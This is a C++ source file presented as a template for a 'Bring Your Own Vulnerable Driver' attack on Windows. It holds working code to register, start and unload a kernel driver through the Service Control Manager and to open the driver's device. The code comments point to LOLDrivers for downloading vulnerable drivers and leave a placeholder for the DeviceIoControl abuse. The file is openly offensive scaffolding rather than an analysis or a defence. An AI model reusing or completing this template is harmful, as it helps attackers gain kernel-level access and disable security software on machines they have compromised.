/*
* Title: BYOVD
* Notes:
*	- This code is just a template. We need to write additional code in the "BYOVD" function for actual attacks.
*	- A vulnerable driver can be downloaded from LOLDrivers (https://www.loldrivers.io/) and set the path to the "wDriverPath" variable.
*	- It required Administrator privilege to load a driver.
* Resources:
*	- https://github.com/ZeroMemoryEx/Blackout
*/
#include <Windows.h>
#include <string>
#include <stdio.h>

BOOL LoadDriver(const std::wstring& wServiceName, const std::wstring& wDriverPath) {
	SC_HANDLE hScm = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
	if (!hScm) {
		printf("Error: Failed to open SCManger.\n");
		return FALSE;
	}

	SC_HANDLE hService = CreateService(
		hScm,
		wServiceName.c_str(),
		wServiceName.c_str(),
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_IGNORE,
		wDriverPath.c_str(),
		nullptr,
		nullptr,
		nullptr,
		nullptr,
		nullptr
	);
	if (!hService) {
		if (GetLastError() == ERROR_SERVICE_EXISTS) {
			printf("The service already exists. Open the serivce.\n");
			hService = OpenService(hScm, wServiceName.c_str(), SERVICE_ALL_ACCESS);
			if (!hService) {
				CloseServiceHandle(hScm);
				return FALSE;
			}
		}
		else {
			printf("ServiceCreationError: 0x%x\n", GetLastError());
			CloseServiceHandle(hScm);
			return FALSE;
		}
	}

	if (!StartService(hService, 0, nullptr)) {
		printf("StartServiceError: 0x%x\n", GetLastError());
		CloseServiceHandle(hService);
		CloseServiceHandle(hScm);
		return FALSE;
	}

	CloseServiceHandle(hService);
	CloseServiceHandle(hScm);

	return TRUE;
}

BOOL UnloadDriver(const std::wstring& wServiceName) {
	SC_HANDLE hScm = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
	if (!hScm) return FALSE;

	SC_HANDLE hService = OpenService(hScm, wServiceName.c_str(), SERVICE_ALL_ACCESS);
	if (!hService) {
		CloseServiceHandle(hScm);
		return FALSE;
	}

	SERVICE_STATUS status;
	if (!ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
		CloseServiceHandle(hService);
		CloseServiceHandle(hScm);
		return FALSE;
	}

	if (!DeleteService(hService)) {
		printf("Failed to delete the service: 0x%x\n", GetLastError());
	}

	CloseServiceHandle(hService);
	CloseServiceHandle(hScm);

	return TRUE;
}

BOOL BYOVD() {
	// Change the following values.
	std::wstring wServiceName = L"VulnDriver";
	std::wstring wDriverPath = L"C:\\vulnerable_driver.sys";

	std::wstring wDevicePath = L"\\\\.\\" + wServiceName;

	if (!LoadDriver(wServiceName, wDriverPath)) {
		printf("Error: Failed to load driver.\n");
		return FALSE;
	}

	printf("Driver loaded successfully.\n");

	HANDLE hDevice = CreateFile(
		wDevicePath.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		0,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);
	if (hDevice == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	/*
	*
	* Write some code here for abusing the vulnerable driver using DeviceIoControl().
	* 
	*/

	CloseHandle(hDevice);
	UnloadDriver(wServiceName);

	return TRUE;
}
